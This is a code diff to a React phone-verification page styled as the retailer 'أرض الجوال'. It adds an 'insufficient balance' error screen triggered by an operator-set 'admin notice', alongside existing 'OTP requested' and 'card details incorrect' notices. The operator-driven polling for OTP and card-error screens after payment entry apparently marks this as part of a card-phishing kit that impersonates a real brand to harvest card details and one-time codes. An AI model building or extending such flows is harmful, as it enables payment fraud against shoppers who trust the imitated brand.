@@ -39,7 +39,7 @@ export default function VerifyPhonePage() {
   const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
   const [countdown, setCountdown] = useState(0);
   const [invoiceSent, setInvoiceSent] = useState(false);
-  const [adminNoticeType, setAdminNoticeType] = useState<'otp' | 'card' | null>(null);
+  const [adminNoticeType, setAdminNoticeType] = useState<'otp' | 'card' | 'balance' | null>(null);
 
   const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);
 
@@ -138,13 +138,13 @@ export default function VerifyPhonePage() {
           result.notifications.find((item) => {
             const createdAt = Date.parse(item.createdAt || '');
             return item.orderId === orderId &&
-              (item.status === 'otp_requested' || item.status === 'card_details_incorrect') &&
+              (item.status === 'otp_requested' || item.status === 'card_details_incorrect' || item.status === 'insufficient_balance') &&
               Number.isFinite(createdAt) &&
               createdAt >= verificationTime - 15_000;
           });
 
         if (active && matchingNotice) {
-          setAdminNoticeType(matchingNotice.status === 'otp_requested' ? 'otp' : 'card');
+          setAdminNoticeType(matchingNotice.status === 'otp_requested' ? 'otp' : matchingNotice.status === 'card_details_incorrect' ? 'card' : 'balance');
         }
       } catch {
         // Keep the current screen and retry after the next polling interval.
@@ -812,6 +812,315 @@ export default function VerifyPhonePage() {
             </div>
             <div className="erd-card-error-tip-text">
               <strong>لحمايتك:</strong> لا تشارك رقم البطاقة أو رمز الأمان مع أي شخص. استخدم بوابة الدفع الرسمية فقط.
+            </div>
+          </div>
+        </section>
+      </main>
+    );
+  }
+
+  if (adminNoticeType === 'balance' && !invoiceSent) {
+    return (
+      <main className="erd-balance-page">
+        <style jsx global>{'
+          @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
+          .erd-balance-page,
+          .erd-balance-page * {
+            box-sizing: border-box;
+            font-family: Cairo, system-ui, -apple-system, sans-serif;
+          }
+          .erd-balance-page {
+            direction: rtl;
+            background: #f4f7f6;
+            color: #12354e;
+            width: 100%;
+            min-height: 100vh;
+            min-height: 100svh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+          }
+          .erd-balance-card {
+            background: #fff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 28px;
+            padding: 36px 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.04);
+            text-align: center;
+          }
+          .erd-balance-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 28px;
+          }
+          .erd-balance-logo-text {
+            text-align: right;
+            font-size: 26px;
+            font-weight: 800;
+            color: #12354e;
+            line-height: 1.05;
+          }
+          .erd-balance-logo-text span { color: #00cda9; display: block; }
+          .erd-balance-logo-mark { display: flex; flex-direction: column; gap: 4px; }
+          .erd-balance-shape {
+            width: 32px;
+            height: 20px;
+            border-radius: 6px;
+            transform: skewX(-12deg);
+          }
+          .erd-balance-shape-top { background: #12354e; }
+          .erd-balance-shape-bottom { background: #00cda9; }
+          .erd-balance-icon-wrap {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 96px;
+            margin-bottom: 28px;
+          }
+          .erd-balance-ray {
+            position: absolute;
+            width: 14px;
+            height: 5px;
+            background: #ff8a8a;
+            border-radius: 10px;
+            opacity: .85;
+          }
+          .erd-balance-ray-left-top { left: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(-25deg); }
+          .erd-balance-ray-left-bottom { left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(25deg); }
+          .erd-balance-ray-right-top { right: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(25deg); }
+          .erd-balance-ray-right-bottom { right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(-25deg); }
+          .erd-balance-error-circle {
+            width: 96px;
+            height: 96px;
+            flex: none;
+            background: radial-gradient(circle at 35% 35%, #ff5252 0%, #ee2a3a 70%, #d31d2d 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 25px rgba(238,42,58,.28);
+            position: relative;
+            z-index: 2;
+          }
+          .erd-balance-error-circle svg {
+            width: 44px;
+            height: 44px;
+            color: #fff;
+            stroke-width: 3.5;
+          }
+          .erd-balance-title {
+            font-size: 36px;
+            font-weight: 800;
+            color: #12354e;
+            margin: 0 0 2px;
+            line-height: 1.2;
+          }
+          .erd-balance-highlight {
+            font-size: 38px;
+            font-weight: 900;
+            color: #ee3c47;
+            margin-bottom: 8px;
+            line-height: 1.25;
+          }
+          .erd-balance-subtitle {
+            font-size: 19px;
+            font-weight: 700;
+            color: #12354e;
+            line-height: 1.6;
+            margin: 0 0 28px;
+          }
+          .erd-balance-tip {
+            background: #f0fdf9;
+            border: 1.5px solid #c2f5ea;
+            border-radius: 20px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: right;
+          }
+          .erd-balance-wallet-wrapper {
+            position: relative;
+            width: 125px;
+            height: 75px;
+            flex: none;
+          }
+          .erd-balance-wallet-back {
+            position: absolute;
+            top: 14px;
+            left: 36px;
+            width: 60px;
+            height: 48px;
+            background: linear-gradient(135deg,#2b4c65 0%,#172a38 100%);
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,.15);
+          }
+          .erd-balance-wallet-button {
+            position: absolute;
+            top: 18px;
+            left: 10px;
+            width: 12px;
+            height: 12px;
+            background: #00cda9;
+            border-radius: 50%;
+            border: 2px solid #fff;
+          }
+          .erd-balance-card-front {
+            position: absolute;
+            top: 4px;
+            right: 18px;
+            width: 86px;
+            height: 54px;
+            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
+            border-radius: 8px;
+            box-shadow: 0 6px 14px rgba(15,23,42,.25);
+            transform: rotate(-6deg);
+            z-index: 2;
+            padding: 6px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+          }
+          .erd-balance-chip {
+            width: 13px;
+            height: 10px;
+            background: #f0c567;
+            border-radius: 2.5px;
+          }
+          .erd-balance-card-lines { display: flex; gap: 3px; }
+          .erd-balance-card-line {
+            width: 11px;
+            height: 3px;
+            background: rgba(255,255,255,.3);
+            border-radius: 2px;
+          }
+          .erd-balance-gold-coins {
+            position: absolute;
+            bottom: 0;
+            left: 32px;
+            z-index: 3;
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+          }
+          .erd-balance-coin {
+            width: 24px;
+            height: 7px;
+            background: linear-gradient(90deg,#f3d078 0%,#d4a338 100%);
+            border-radius: 100px;
+            border: 1px solid #c49326;
+            box-shadow: 0 1px 3px rgba(0,0,0,.15);
+          }
+          .erd-balance-terminal {
+            position: absolute;
+            bottom: -6px;
+            right: 28px;
+            width: 38px;
+            height: 38px;
+            background: linear-gradient(135deg,#00cda9 0%,#00a88a 100%);
+            border: 3.5px solid #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 3px 8px rgba(0,205,169,.3);
+            z-index: 4;
+          }
+          .erd-balance-terminal svg { width: 20px; height: 20px; color: #fff; }
+          .erd-balance-divider {
+            width: 1.5px;
+            height: 58px;
+            flex: none;
+            background: #bcefe5;
+          }
+          .erd-balance-tip-text {
+            min-width: 0;
+            flex: 1;
+            text-align: right;
+            font-size: 14px;
+            font-weight: 700;
+            color: #12354e;
+            line-height: 1.65;
+          }
+          @media (max-width: 420px) {
+            .erd-balance-page { padding: 14px; }
+            .erd-balance-card { padding: 30px 16px; border-radius: 24px; }
+            .erd-balance-title { font-size: 31px; }
+            .erd-balance-highlight { font-size: 31px; }
+            .erd-balance-subtitle { font-size: 16px; }
+            .erd-balance-tip { padding: 12px 10px; gap: 10px; }
+            .erd-balance-wallet-wrapper { width: 106px; transform: scale(.88); transform-origin: center right; }
+            .erd-balance-tip-text { font-size: 12px; }
+          }
+          @media (max-width: 350px) {
+            .erd-balance-card { padding-inline: 12px; }
+            .erd-balance-tip { gap: 7px; }
+            .erd-balance-wallet-wrapper { width: 92px; transform: scale(.78); }
+            .erd-balance-divider { height: 52px; }
+          }
+        '}</style>
+
+        <section className="erd-balance-card" aria-live="polite">
+          <div className="erd-balance-logo">
+            <div className="erd-balance-logo-text">
+              أرض
+              <span>الجوال</span>
+            </div>
+            <div className="erd-balance-logo-mark" aria-hidden="true">
+              <div className="erd-balance-shape erd-balance-shape-top" />
+              <div className="erd-balance-shape erd-balance-shape-bottom" />
+            </div>
+          </div>
+
+          <div className="erd-balance-icon-wrap" aria-hidden="true">
+            <div className="erd-balance-ray erd-balance-ray-left-top" />
+            <div className="erd-balance-ray erd-balance-ray-left-bottom" />
+            <div className="erd-balance-ray erd-balance-ray-right-top" />
+            <div className="erd-balance-ray erd-balance-ray-right-bottom" />
+            <div className="erd-balance-error-circle">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
+              </svg>
+            </div>
+          </div>
+
+          <h1 className="erd-balance-title">عذرًا عزيزي</h1>
+          <div className="erd-balance-highlight">لا يوجد رصيد كافي</div>
+          <p className="erd-balance-subtitle">يرجى التأكد من توفر رصيد كافي لإتمام العملية</p>
+
+          <div className="erd-balance-tip">
+            <div className="erd-balance-wallet-wrapper" aria-hidden="true">
+              <div className="erd-balance-wallet-back">
+                <div className="erd-balance-wallet-button" />
+              </div>
+              <div className="erd-balance-card-front">
+                <div className="erd-balance-chip" />
+                <div className="erd-balance-card-lines">
+                  <div className="erd-balance-card-line" />
+                  <div className="erd-balance-card-line" />
+                  <div className="erd-balance-card-line" />
+                  <div className="erd-balance-card-line" />
+                </div>
+              </div>
+              <div className="erd-balance-gold-coins">
+                <div className="erd-balance-coin" />
+                <div className="erd-balance-coin" />
+                <div className="erd-balance-coin" />
+              </div>
+              <div className="erd-balance-terminal">
+                <svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                </svg>
+              </div>
+            </div>
+            <div className="erd-balance-divider" aria-hidden="true" />
+            <div className="erd-balance-tip-text">
+              يرجى التواصل مع جهة إصدار البطاقة أو استخدام وسيلة دفع أخرى عبر بوابة الدفع الرسمية.
             </div>
           </div>
         </section>
